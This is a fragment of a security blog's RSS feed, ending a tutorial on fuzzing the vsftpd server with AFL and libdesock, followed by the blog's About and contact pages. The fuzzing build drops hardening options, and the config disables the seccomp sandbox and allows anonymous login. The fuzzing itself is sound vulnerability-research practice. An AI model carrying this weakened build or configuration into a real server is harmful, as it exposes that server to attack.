&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> INSTALL = install
IFLAGS = -idirafter dummyinc
#CFLAGS = -g
&lt;span style="color:#f92672">-CFLAGS = -O2 -fPIE -fstack-protector --param=ssp-buffer-size=4 \
&lt;/span>&lt;span style="color:#f92672">- -Wall -W -Wshadow -Werror -Wformat-security \
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+CFLAGS = -fsanitize=address -g -Og -fPIE -fstack-protector \
&lt;/span>&lt;span style="color:#a6e22e">+ -Wall -W -Wshadow -Wformat-security \
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> -D_FORTIFY_SOURCE=2 \
#-pedantic -Wconversion
LIBS = `./vsf_findlibs.sh`
&lt;span style="color:#f92672">-LINK = -Wl,-s
&lt;/span>&lt;span style="color:#f92672">-LDFLAGS = -fPIE -pie -Wl,-z,relro -Wl,-z,now
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+LINK =
&lt;/span>&lt;span style="color:#a6e22e">+LDFLAGS = -fPIE -pie -Wl,-z,relro -Wl,-z,now -fsanitize=address
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>
OBJS = main.o utility.o prelogin.o ftpcmdio.o postlogin.o privsock.o \
tunables.o ftpdataio.o secbuf.o ls.o \
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="runtime-configuration">Runtime configuration&lt;/h3>
&lt;p>Like most other servers, vsftpd needs a config file. Create
&lt;code>fuzz.conf&lt;/code> with the following contents:&lt;/p>
&lt;pre tabindex="0">&lt;code>listen=YES
seccomp_sandbox=NO
one_process_model=YES
# User management
anonymous_enable=YES
no_anon_password=YES
nopriv_user=nobody
# Permissions
connect_from_port_20=NO
run_as_launching_user=YES
listen_port=2121
listen_address=127.0.0.1
pasv_address=127.0.0.1
# Filesystem interactions
write_enable=NO
download_enable=NO
&lt;/code>&lt;/pre>&lt;h3 id="start-fuzzing">Start fuzzing&lt;/h3>
&lt;p>To use the desocketing library with AFL we need to set the &lt;code>AFL_PRELOAD&lt;/code>
variable.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">export AFL_PRELOAD&lt;span style="color:#f92672">=&lt;/span>libdesock.so
afl-fuzz -i corpus -o findings -m none -- ./vsftpd fuzz.conf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://lolcads.github.io/2022/02/afl.svg" alt="">&lt;/p>
&lt;p>Now it&amp;rsquo;s only a matter of high-quality custom mutators and time to find some bugs.&lt;/p>
&lt;p>libdesock can be downloaded here: &lt;a href="https://github.com/fkie-cad/libdesock">https://github.com/fkie-cad/libdesock&lt;/a>&lt;/p></content></item><item><title>About</title><link>https://lolcads.github.io/example/</link><pubDate>Thu, 28 Feb 2019 00:00:00 +0000</pubDate><guid>https://lolcads.github.io/example/</guid><description>Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.
Hugo makes use of a variety of open source projects including:
https://github.</description><content>&lt;p>Written in Go, Hugo is an open source static site generator available under the &lt;a href="https://github.com/gohugoio/hugo/blob/master/LICENSE">Apache Licence 2.0.&lt;/a> Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.&lt;/p>
&lt;p>Hugo makes use of a variety of open source projects including:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/yuin/goldmark">https://github.com/yuin/goldmark&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/alecthomas/chroma">https://github.com/alecthomas/chroma&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/muesli/smartcrop">https://github.com/muesli/smartcrop&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/spf13/cobra">https://github.com/spf13/cobra&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/spf13/viper">https://github.com/spf13/viper&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.&lt;/p>
&lt;p>Hugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.&lt;/p>
&lt;p>Websites built with Hugo are extremelly fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.&lt;/p>
&lt;p>Learn more and contribute on &lt;a href="https://github.com/gohugoio">GitHub&lt;/a>.&lt;/p></content></item><item><title>About</title><link>https://lolcads.github.io/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://lolcads.github.io/about/</guid><description>This is a tech blog of loosly coupled individuals that like to sometimes play CTFs but mostly just have fun with deeply technical topics such as (malware) reverse engineering, fuzzing, vulnerability research, forensics, &amp;hellip; We hope you will find some valuable information on our site :) Get in touch if you want via Contact.</description><content>&lt;p>This is a tech blog of loosly coupled individuals that like to sometimes play CTFs but mostly just have fun with deeply technical topics such as (malware) reverse engineering, fuzzing, vulnerability research, forensics, &amp;hellip;
We hope you will find some valuable information on our site :)
Get in touch if you want via &lt;a href="https://lolcads.github.io/contact">Contact&lt;/a>.&lt;/p></content></item><item><title>Contact</title><link>https://lolcads.github.io/contact/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://lolcads.github.io/contact/</guid><description>You can reach us at: Feel free to use our PGP key (fingerprint: CCD8 D75E 9A10 6BF4 3668 AB99 7E64 EF83 D585 CECA)</description><content>&lt;p>You can reach us at: &lt;img src="https://lolcads.github.io/mail.png" alt="alt">
Feel free to use our &lt;a href="https://lolcads.github.io/lolcads.pub">PGP key&lt;/a> (fingerprint: &lt;code>CCD8 D75E 9A10 6BF4 3668 AB99 7E64 EF83 D585 CECA&lt;/code>)&lt;/p></content></item></channel></rss>